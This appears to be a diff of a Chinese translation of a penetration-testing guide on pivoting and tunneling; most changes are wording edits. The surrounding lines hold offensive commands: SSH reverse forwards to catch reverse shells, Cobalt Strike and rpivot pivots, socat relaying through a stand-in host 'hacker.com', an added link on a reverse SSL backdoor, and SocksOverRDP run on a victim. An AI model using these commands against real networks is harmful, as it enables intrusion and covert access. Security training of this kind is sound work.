@@ -57,7 +57,7 @@ ssh -f -N -D <attacker_port> <username>@<ip_compromised> #All sent to local port
 ```
 ### 反向端口转发
 
-这对于从内部主机通过 DMZ 获取反向 shell 到您的主机非常有用：
+这对于从内部主机通过DMZ获取反向shell到您的主机非常有用：
 ```bash
 ssh -i dmz_key -R <dmz_internal_ip>:443:0.0.0.0:7000 root@10.129.203.111 -vN
 # Now you can send a rev to dmz_internal_ip:443 and capture it in localhost:7000
@@ -93,7 +93,7 @@ route add -net 10.0.0.0/16 gw 1.1.1.1
 
 ## SSHUTTLE
 
-您可以通过**ssh**将所有**流量**通过主机**隧道**到**子网络**。\
+您可以通过**ssh**将所有**流量**隧道到一个**子网络**通过一个主机。\
 例如，转发所有流量到10.10.10.0/24
 ```bash
 pip install sshuttle
@@ -157,13 +157,13 @@ rportfwd stop [bind port]
 需要注意：
 
 - Beacon 的反向端口转发旨在 **将流量隧道传输到 Team Server，而不是在单个机器之间中继**。
-- 流量在 **Beacon 的 C2 流量中隧道传输**，包括 P2P 链接。
+- 流量是 **在 Beacon 的 C2 流量中隧道传输**，包括 P2P 链接。
 - **不需要管理员权限** 来在高端口上创建反向端口转发。
 
 ### rPort2Port 本地
 
 > [!WARNING]
-> 在这种情况下，**端口在 beacon 主机上打开**，而不是在 Team Server 上，**流量发送到 Cobalt Strike 客户端**（而不是 Team Server），然后从那里发送到指定的主机:端口。
+> 在这种情况下，**端口是在 beacon 主机上打开的**，而不是在 Team Server 上，**流量被发送到 Cobalt Strike 客户端**（而不是 Team Server），然后从那里发送到指定的 host:port。
 ```bash
 rportfwd_local [bind port] [forward host] [forward port]
 rportfwd_local stop [bind port]
@@ -250,7 +250,7 @@ attacker> python server.py --server-port 9999 --server-ip 0.0.0.0 --proxy-ip 127
 ```bash
 victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999
 ```
-通过 **NTLM 代理** 进行中转
+通过 **NTLM 代理** 进行枢轴
 ```bash
 victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --password P@ssw0rd
 ```
@@ -294,6 +294,8 @@ victim> socat.exe TCP-LISTEN:2222 OPENSSL,verify=1,cert=client.pem,cafile=server
 ```bash
 OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|PROXY:hacker.com:443,connect-timeout=5|TCP:proxy.lan:8080,connect-timeout=5
 ```
+[https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/](https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/)
+
 ### SSL Socat Tunnel
 
 **/bin/sh console**
@@ -345,10 +347,10 @@ netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=4444
 ```
 ## SocksOverRDP & Proxifier
 
-您需要拥有**系统的RDP访问权限**。\
+您需要拥有**系统的 RDP 访问权限**。\
 下载：
 
-1. [SocksOverRDP x64 Binaries](https://github.com/nccgroup/SocksOverRDP/releases) - 此工具使用Windows的远程桌面服务功能中的`动态虚拟通道`（`DVC`）。DVC负责**在RDP连接上隧道数据包**。
+1. [SocksOverRDP x64 Binaries](https://github.com/nccgroup/SocksOverRDP/releases) - 此工具使用 Windows 远程桌面服务功能中的 `Dynamic Virtual Channels` (`DVC`)。DVC 负责**在 RDP 连接上隧道数据包**。
 2. [Proxifier Portable Binary](https://www.proxifier.com/download/#win-tab)
 
 在您的客户端计算机上加载**`SocksOverRDP-Plugin.dll`**，如下所示：
@@ -356,13 +358,13 @@ netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=4444
 # Load SocksOverRDP.dll using regsvr32.exe
 C:\SocksOverRDP-x64> regsvr32.exe SocksOverRDP-Plugin.dll
 ```
-现在我们可以通过 **RDP** 使用 **`mstsc.exe`** 连接到 **victim**，我们应该收到一个 **提示**，说明 **SocksOverRDP 插件已启用**，并且它将 **监听** 在 **127.0.0.1:1080**。
+现在我们可以通过 **RDP** 使用 **`mstsc.exe`** 连接到 **victim**，我们应该收到一个 **prompt**，提示 **SocksOverRDP plugin is enabled**，并且它将 **listen** 在 **127.0.0.1:1080**。
 
-通过 **RDP** 连接并在受害者机器上上传并执行 `SocksOverRDP-Server.exe` 二进制文件：
+通过 **RDP** 连接，并在受害者机器上上传并执行 `SocksOverRDP-Server.exe` 二进制文件：
 ```
 C:\SocksOverRDP-x64> SocksOverRDP-Server.exe
 ```
-现在，在你的机器（攻击者）上确认端口 1080 正在监听：
+现在在你的机器（攻击者）上确认端口 1080 正在监听：
 ```
 netstat -antb | findstr 1080
 ```
@@ -370,9 +372,9 @@ netstat -antb | findstr 1080
 
 ## 代理 Windows GUI 应用程序
 
-您可以使用 [**Proxifier**](https://www.proxifier.com/) 使 Windows GUI 应用程序通过代理进行导航。\
+您可以使用 [**Proxifier**](https://www.proxifier.com/) 使 Windows GUI 应用程序通过代理导航。\
 在 **Profile -> Proxy Servers** 中添加 SOCKS 服务器的 IP 和端口。\
-在 **Profile -> Proxification Rules** 中添加要代理的程序名称和要代理的 IP 连接。
+在 **Profile -> Proxification Rules** 中添加要代理的程序名称和要代理的 IP 的连接。
 
 ## NTLM 代理绕过
 
@@ -394,8 +396,8 @@ Domain CONTOSO.COM
 Proxy 10.0.0.10:8080
 Tunnel 2222:<attackers_machine>:443
 ```
-现在，如果你在受害者的 **SSH** 服务上设置监听端口为 443。你可以通过攻击者的端口 2222 连接到它。\
-你也可以使用连接到 localhost:443 的 **meterpreter**，而攻击者在端口 2222 上监听。
+现在，如果你在受害者的 **SSH** 服务上设置监听端口为 443。你可以通过攻击者的 2222 端口连接到它。\
+你也可以使用连接到 localhost:443 的 **meterpreter**，而攻击者在 2222 端口监听。
 
 ## YARP
 
@@ -413,7 +415,7 @@ attacker> iodined -f -c -P P@ssw0rd 1.1.1.1 tunneldomain.com
 victim> iodine -f -P P@ssw0rd tunneldomain.com -r
 #You can see the victim at 1.1.1.2
 ```
-隧道将非常慢。您可以通过使用以下命令创建一个压缩的SSH连接：
+隧道将非常慢。您可以通过使用以下命令在此隧道中创建一个压缩的SSH连接：
 ```
 ssh <user>@1.1.1.2 -C -c blowfish-cbc,arcfour -o CompressionLevel=9 -D 1080
 ```
@@ -576,7 +578,7 @@ cloudflared tunnel run mytunnel
 
 ## FRP (快速反向代理)
 
-[`frp`](https://github.com/fatedier/frp) 是一个积极维护的 Go 反向代理，支持 **TCP、UDP、HTTP/S、SOCKS 和 P2P NAT 穿透**。从 **v0.53.0（2024年5月）** 开始，它可以充当 **SSH 隧道网关**，因此目标主机可以仅使用标准的 OpenSSH 客户端启动反向隧道 - 无需额外的二进制文件。
+[`frp`](https://github.com/fatedier/frp) 是一个积极维护的 Go 反向代理，支持 **TCP、UDP、HTTP/S、SOCKS 和 P2P NAT 穿透**。从 **v0.53.0 (2024年5月)** 开始，它可以充当 **SSH 隧道网关**，因此目标主机可以仅使用标准的 OpenSSH 客户端启动反向隧道 - 无需额外的二进制文件。
 
 ### 经典反向 TCP 隧道
 ```bash
